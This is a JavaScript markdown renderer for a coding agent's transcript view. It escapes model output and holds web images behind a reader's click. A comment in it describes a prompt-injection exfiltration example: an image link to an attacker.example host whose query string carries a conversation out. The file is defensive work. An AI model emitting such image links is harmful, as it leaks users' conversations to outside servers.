/* A markdown renderer small enough to read in one sitting.
 *
 * Everything is escaped first, then the shapes are applied to the escaped
 * text — the model's output is untrusted input, never markup. Covers what a
 * coding agent actually emits: fenced code, lists, headings, pipe tables,
 * images, standalone video URLs, emphasis, links, and code spans. Anything
 * else falls through as a paragraph. Web media paints as a slot that waits
 * for the reader's click: the URL of a fetched picture is a channel out of
 * the machine, and the prose naming it is untrusted.
 */
import { restoreText } from './waf-restore.js';

const escapeHtml = (s) => s
  .replace(/&/g, '&amp;')
  .replace(/</g, '&lt;')
  .replace(/>/g, '&gt;')
  .replace(/"/g, '&quot;');

// Media is only ever fetched from the open web, never from a scheme that can
// run code (`javascript:`, `data:`). The same rule as links.
const safeSrc = (src) => {
  const s = String(src ?? '').trim();
  return /^https?:\/\/[^\s]+$/i.test(s) ? s : null;
};

const VIDEO_SRC = /\.(?:mp4|m4v|webm|ogv|ogg|mov)(?:[?#][^\s]*)?$/i;
const looksLikeVideo = (src, label = '') => VIDEO_SRC.test(src) || VIDEO_SRC.test(label.trim());

/* A web media slot that waits for the reader's click.
 *
 * A picture or clip addressed on the open web is also a channel out of the
 * machine: the moment the element loads, its URL — query string included —
 * reaches a server the prose chose, and the prose is untrusted. A
 * prompt-injected reply can carry a whole conversation out in one
 * `![](https://attacker.example/x.png?d=…)`, and neither
 * referrerpolicy="no-referrer" (that is only the Referer header) nor
 * loading="lazy" (the reply is on screen at once anyway) stops it.
 *
 * So the paint carries no `src` at all — an element without one fetches
 * nothing — and the address rides in `data-md-src`. `loadDeferredMedia` is
 * the only thing that turns a slot into a fetch, and transcript.js wires it
 * to the click and to the Enter key of the slot's button role: the consent
 * is the reader's, not the reply's. The values arrive already HTML-escaped —
 * the block path escapes them first, and inline() captures from text that
 * was escaped before the shapes ran.
 */
const deferredMedia = (kind, escSrc, escAlt = '', extra = '') => {
  const cls = `md-media-deferred${extra ? ` ${extra}` : ''}`;
  const label = kind === 'video' ? 'Load video' : 'Load image';
  const name = escAlt ? `${label}: ${escAlt}` : label;
  return kind === 'video'
    ? `<video class="md-video ${cls}" preload="none" playsinline role="button" tabindex="0" aria-label="${name}" title="${escSrc}" data-md-src="${escSrc}"></video>`
    : `<img class="md-image ${cls}" role="button" tabindex="0" aria-label="${name}" title="${escSrc}" alt="${escAlt}" loading="lazy" referrerpolicy="no-referrer" data-md-src="${escSrc}">`;
};

/* The one origin that loads without a click: the account's own. The bridge
 * reaches de.aipass.net and its subdomains, the extension's host permissions
 * cover exactly that origin, and those hosts already hold the whole
 * conversation — a URL addressed there carries nothing they do not have.
 * Anywhere else stays behind the click. (Pinned against the manifest in
 * test/ui-md.test.mjs: the allowlist may not grow past the origin the bridge
 * side already speaks for.) */
const ACCOUNT_MEDIA_HOST = /(?:^|\.)aipass\.net$/i;
const trustedMediaSrc = (src) => {
  try { return ACCOUNT_MEDIA_HOST.test(new URL(String(src)).hostname); } catch { return false; }
};

/* The account's own media, which needs no consent: the element carries its
 * src from the first paint. Same escaped-values deal as deferredMedia. */
const trustedMediaTag = (kind, escSrc, escAlt = '', extra = '') => {
  const cls = extra ? ` ${extra}` : '';
  return kind === 'video'
    ? `<video class="md-video${cls}" controls preload="metadata" playsinline src="${escSrc}"></video>`
    : `<img class="md-image${cls}" src="${escSrc}" alt="${escAlt}" loading="lazy" referrerpolicy="no-referrer">`;
};

/* Block media: the account's own loads at once, the open web waits. */
const mediaTag = (kind, escSrc, escAlt = '') => (
  trustedMediaSrc(escSrc) ? trustedMediaTag(kind, escSrc, escAlt) : deferredMedia(kind, escSrc, escAlt)
);

/* The consent: give the slot its source, and only then. The address is
 * re-validated here — the attribute is as readable by anything in the page
 * as it is by the reader's click — and a slot that already loaded (or never
 * carried a web address) loads nothing the second time. */
export function loadDeferredMedia(media) {
  const src = safeSrc(media?.dataset?.mdSrc);
  if (!src) return null;
  media.src = src;
  if (String(media.tagName).toUpperCase() === 'VIDEO') {
    media.preload = 'metadata';
    media.controls = true;
  }
  media.classList?.remove('md-media-deferred');
  for (const attr of ['role', 'tabindex', 'aria-label', 'data-md-src']) media.removeAttribute?.(attr);
  return src;
}

const inline = (s) => {
  // Code spans and media are complete HTML once built. Stash them behind a
  // sentinel so the emphasis passes cannot rewrite an `*` inside a URL, and a
  // quoted image in backticks is never fetched.
  const kept = [];
  const stash = (html) => `\u0000${kept.push(html) - 1}\u0000`;
  let out = escapeHtml(s)
    .replace(/`([^`\n]+)`/g, (_, c) => stash(`<code>${c}</code>`))
    .replace(/!\[([^\]\n]*)\]\((https?:\/\/[^)\s]+)\)/g, (whole, alt, src) => {
      // Everything above is already escaped; src/alt can go straight into the
      // attributes. A video written as an image is a link while inline — only a
      // line of its own can grow a player.
      if (!safeSrc(src)) return whole;
      if (looksLikeVideo(src, alt)) return stash(`<a class="md-link" href="${src}" target="_blank" rel="noreferrer">${alt || 'video'}</a>`);
      const cls = 'md-image-inline';
      return stash(trustedMediaSrc(src) ? trustedMediaTag('image', src, alt, cls) : deferredMedia('image', src, alt, cls));
    });
  out = out
    .replace(/\*\*([^*\n]+)\*\*/g, '<strong>$1</strong>')
    .replace(/(^|[\s(])\*([^*\n]+)\*/g, '$1<em>$2</em>')
    .replace(/\[([^\]]+)\]\((https?:[^)\s]+)\)/g, '<a class="md-link" href="$2" target="_blank" rel="noreferrer">$1</a>');
  return out.replace(/\u0000(\d+)\u0000/g, (_, i) => kept[Number(i)]);
};

/* A line that is nothing but an image or a video URL becomes a block of its
 * own. This is also what splitMarkdownStable looks for, so the two functions
 * must agree on the shape. */
const mediaLine = (line) => {
  const image = line.match(/^\s*!\[([^\]\n]*)\]\((https?:\/\/[^)\s]+)\)\s*$/);
  if (image && safeSrc(image[2])) {
    return { kind: looksLikeVideo(image[2], image[1]) ? 'video' : 'image', src: image[2], alt: image[1].trim() };
  }
  const link = line.match(/^\s*\[([^\]\n]*)\]\((https?:\/\/[^)\s]+)\)\s*$/);
  if (link && safeSrc(link[2]) && looksLikeVideo(link[2], link[1])) {
    return { kind: 'video', src: link[2], alt: link[1].trim() };
  }
  const bare = line.match(/^\s*(https?:\/\/[^\s]+)\s*$/);
  if (bare && looksLikeVideo(bare[1]) && safeSrc(bare[1])) {
    return { kind: 'video', src: bare[1], alt: '' };
  }
  return null;
};

const mediaBlock = (media) => {
  const tag = mediaTag(media.kind, escapeHtml(media.src), escapeHtml(media.alt));
  const caption = media.alt ? `<figcaption>${escapeHtml(media.alt)}</figcaption>` : '';
  return `<figure class="md-figure${media.kind === 'video' ? ' md-video-figure' : ''}">${tag}${caption}</figure>`;
};

/* A pipe row, with `\|` and pipes inside code spans kept in their cell. */
const splitTableRow = (line) => {
  let s = line.trim();
  if (s.startsWith('|')) s = s.slice(1);
  if (s.endsWith('|') && !s.endsWith('\\|')) s = s.slice(0, -1);
  const cells = [];
  let cell = '';
  let code = false;
  for (let i = 0; i < s.length; i++) {
    const ch = s[i];
    if (ch === '`') { code = !code; cell += ch; continue; }
    if (ch === '\\' && s[i + 1] === '|') { cell += '|'; i++; continue; }
    if (ch === '|' && !code) { cells.push(cell.trim()); cell = ''; continue; }
    cell += ch;
  }
  cells.push(cell.trim());
  return cells;
};

const isTableSeparator = (line) => {
  if (!line.includes('|')) return false;
  const cells = splitTableRow(line);
  return cells.length > 0 && cells.every((cell) => /^:?-+:?$/.test(cell));
};

const cellAlign = (cell) => {
  const left = cell.startsWith(':');
  const right = cell.endsWith(':');
  return left && right ? 'center' : right ? 'right' : left ? 'left' : '';
};

const tableHtml = (head, align, rows) => {
  const cell = (tag, text, i) => {
    const a = align[i];
    const cls = a ? ` class="al-${a}"` : '';
    return `<${tag}${cls}>${inline(text)}</${tag}>`;
  };
  const body = rows.length
    ? `<tbody>${rows.map((row) => `<tr>${head.map((_, i) => cell('td', row[i] ?? '', i)).join('')}</tr>`).join('')}</tbody>`
    : '';
  return `<div class="md-table-wrap"><table><thead><tr>${head.map((c, i) => cell('th', c, i)).join('')}</tr></thead>${body}</table></div>`;
};

/**
 * Where a streamed source stops being re-renderable: `stable` is every block
 * whose rendering can no longer change as more text arrives, `tail` is the one
 * construct still open at the end (the growing paragraph, list, table or code
 * fence).
 *
 * `paintAssistant` paints the two apart so a long answer stops re-parsing its
 * own finished prefix on every frame — the settled stretch is rendered once
 * and only the tail repaints. The split must be invisible: for any source,
 * `renderMarkdown(src)` equals the two pieces rendered and joined, and as the
 * source grows the stable piece only ever gains text (never rewrites), which is
 * what lets the window append instead of reset. Both properties are pinned in
 * test/ui-md.test.mjs.
 */
export function splitMarkdownStable(src) {
  const text = String(src ?? '').replace(/\r\n/g, '\n');
  let at = 0;            // char offset of the line being read
  let openAt = null;     // where the construct still open at the end began
  let openKind = null;   // 'para' | 'ul' | 'ol' | 'fence' | 'table'
  let fence = false;
  const close = () => { openAt = null; openKind = null; };
  for (const line of text.split('\n')) {
    if (fence) {
      if (/^\s*```\s*$/.test(line)) { fence = false; close(); }
      at += line.length + 1;
      continue;
    }
    if (/^\s*```(\S*)\s*$/.test(line)) { fence = true; openAt = at; openKind = 'fence'; at += line.length + 1; continue; }
    // Headings, rules and quote lines are whole in themselves (this renderer
    // closes each on its own line), the way renderMarkdown treats them.
    if (/^(#{1,4})\s+/.test(line) || /^\s*([-*_])\1{2,}\s*$/.test(line) || /^\s*>/.test(line)) { close(); at += line.length + 1; continue; }
    // A standalone image or video is likewise complete on its line.
    if (mediaLine(line)) { close(); at += line.length + 1; continue; }
    const ul = /^\s*[-*+]\s+/.test(line);
    const ol = /^\s*\d+[.)]\s+/.test(line);
    if (ul || ol) {
      const kind = ul ? 'ul' : 'ol';
      if (openKind !== kind) { openAt = at; openKind = kind; }
      at += line.length + 1;
      continue;
    }
    // A run of pipe lines may still turn into a table, so it stays open. If a
    // paragraph is already open the whole paragraph stays with it: a header
    // cannot be settled before its separator row arrives.
    if (line.includes('|') && openKind !== 'para') {
      if (openKind !== 'table') { openAt = at; openKind = 'table'; }
      at += line.length + 1;
      continue;
    }
    if (!line.trim()) { close(); at += line.length + 1; continue; }
    // A run of pipe lines that no separator turned into a table is just prose.
    // Keep its first line in the tail: the next prose line may join it into the
    // same paragraph, so settling it alone would paint two paragraphs.
    if (openKind === 'table') openKind = 'para';
    else if (openKind !== 'para') { openAt = at; openKind = 'para'; }
    at += line.length + 1;
  }
  const cut = openAt ?? text.length;
  return { stable: text.slice(0, cut), tail: text.slice(cut) };
}

export function renderMarkdown(src) {
  // The wire spellings go back first: a URL the model quoted from a search
  // arrives as HTTPS-URL…, and a link the reader can click needs the real
  // scheme. The escape below still runs on the result, so nothing untrusted
  // becomes markup by being restored.
  const text = restoreText(String(src ?? '').replace(/\r\n/g, '\n'));
  const lines = text.split('\n');
  const out = [];
  let para = [];
  let list = null;
  let fence = null;
  let fenceLang = '';
  let code = [];

  const flushPara = () => {
    if (para.length) { out.push(`<p>${inline(para.join(' '))}</p>`); para = []; }
  };
  const flushList = () => {
    if (!list) return;
    const tag = list === 'ul' ? 'ul' : 'ol';
    out.push(`<${tag}>${listItems.join('')}</${tag}>`);
    list = null;
    listItems = [];
  };
  let listItems = [];

  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    if (fence !== null) {
      if (new RegExp(`^\\s*\`\`\`\\s*$`).test(line)) {
        out.push(`<pre><code class="lang-${escapeHtml(fenceLang)}">${escapeHtml(code.join('\n'))}</code></pre>`);
        fence = null; code = [];
      } else code.push(line);
      continue;
    }
    const open = line.match(/^\s*```(\S*)\s*$/);
    if (open) { flushPara(); flushList(); fence = open[1] || ''; continue; }

    const heading = line.match(/^(#{1,4})\s+(.*)$/);
    if (heading) { flushPara(); flushList(); const n = heading[1].length; out.push(`<h${n}>${inline(heading[2])}</h${n}>`); continue; }

    if (/^\s*([-*_])\1{2,}\s*$/.test(line)) { flushPara(); flushList(); out.push('<hr/>'); continue; }

    const media = mediaLine(line);
    if (media) { flushPara(); flushList(); out.push(mediaBlock(media)); continue; }

    const ul = line.match(/^\s*[-*+]\s+(.*)$/);
    if (ul) {
      flushPara();
      if (list !== 'ul') { flushList(); list = 'ul'; }
      listItems.push(`<li>${inline(ul[1])}</li>`);
      continue;
    }
    const ol = line.match(/^\s*\d+[.)]\s+(.*)$/);
    if (ol) {
      flushPara();
      if (list !== 'ol') { flushList(); list = 'ol'; }
      listItems.push(`<li>${inline(ol[1])}</li>`);
      continue;
    }
    if (/^\s*>/.test(line)) {
      flushPara(); flushList();
      out.push(`<blockquote>${inline(line.replace(/^\s*>\s?/, ''))}</blockquote>`);
      continue;
    }
    if (line.includes('|') && i + 1 < lines.length && isTableSeparator(lines[i + 1])) {
      flushPara(); flushList();
      const head = splitTableRow(line);
      const align = splitTableRow(lines[i + 1]).map(cellAlign);
      i += 2;
      const rows = [];
      while (i < lines.length && lines[i].trim() && lines[i].includes('|')) {
        rows.push(splitTableRow(lines[i]));
        i++;
      }
      i--;
      out.push(tableHtml(head, align, rows));
      continue;
    }
    if (!line.trim()) { flushPara(); flushList(); continue; }
    flushList();
    para.push(line.trim());
  }
  if (fence !== null) out.push(`<pre><code>${escapeHtml(code.join('\n'))}</code></pre>`);
  flushPara(); flushList();
  return out.join('\n');
}

export { escapeHtml, inline, ACCOUNT_MEDIA_HOST };
